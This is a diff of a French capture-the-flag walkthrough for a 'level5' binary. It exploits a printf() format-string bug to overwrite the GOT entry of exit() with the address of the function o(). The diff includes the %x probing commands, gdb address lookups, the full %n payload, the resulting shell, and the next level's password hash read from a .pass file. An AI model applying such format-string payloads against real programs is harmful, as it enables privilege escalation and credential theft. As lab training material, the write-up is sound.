@@ -113,34 +113,66 @@ End of assembler dump.
 On determine du coup que la fonction `o()` pourra etre utilise pour atteindre le stdin, mais pour ce faire on va de nouveau exploiter `printf()`
 
 ```
-:~$ echo "%x %x %x %x" | ./level5
-200 b7fd1ac0 b7ff37d0 25207825
+:~$ python -c 'print " %x" * 4' | ./level5
+ 200 b7fd1ac0 b7ff37d0 25207825
 
-:~$ echo "aaaa %x %x %x %x" | ./level5
+:~$ python -c 'print "aaaa" + " %x" * 4' | ./level5
 aaaa 200 b7fd1ac0 b7ff37d0 61616161
 ```
 
-Notre buffer est en 4e position
+On decouvre que notre buffer est en 4e position. Apres la fonction `printf()` on trouve un appel de la fonction `exit()`, on va donc faire en sorte de remplacer l'adresse de cette derniere, par l'appel de la fonction `o()`
 
 ```
 (gdb) info function exit
 All defined functions:
 
 Non-debugging symbols:
-0x08048390  _exit
-0x08048390  _exit@plt
-0x080483d0  exit
+(...)
 0x080483d0  exit@plt
+
+(gdb) x/i 0x080483d0
+   0x80483d0 <exit@plt>:	jmp    *0x8049838
 
 (gdb) info function o
 All defined functions:
 
 Non-debugging symbols:
-0x080483c0  __gmon_start__
-0x080483c0  __gmon_start__@plt
-0x08048420  __do_global_dtors_aux
+(...)
 0x080484a4  o
-0x080485a0  __do_global_ctors_aux
+(...)
 ```
 
-...
+On obtient ainsi les adresses desirees dans le GOT*:
+- `exit()` : **0x8049838**
+- `o()` : **0x080484a4**
+
+
+
+>
+>
+>
+A present qu'on a toutes les informations neccessaires, il est tant de preparer notre exploit:
+- exit adresse dans le GOT: "\x38\x98\x04\x08" (4 bytes)
+- 134513828 (adresse de `o()`) - 4 bytes (exit) = 134513824
+A PRECISER PLUS !!!!!!!!!!!!!!!!!!!!!
+
+>
+>
+>
+
+
+```
+:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/level5
+
+:~$ cat /tmp/level5 - | ./level5
+(...)
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+
+
+_Informations supplementaires_:
+>*Global Offset Table, or GOT, is a section of a computer program's (executables and shared libraries) memory used to enable computer program code compiled as an ELF file to run correctly, independent of the memory address where the program's code or data is loaded at runtime.
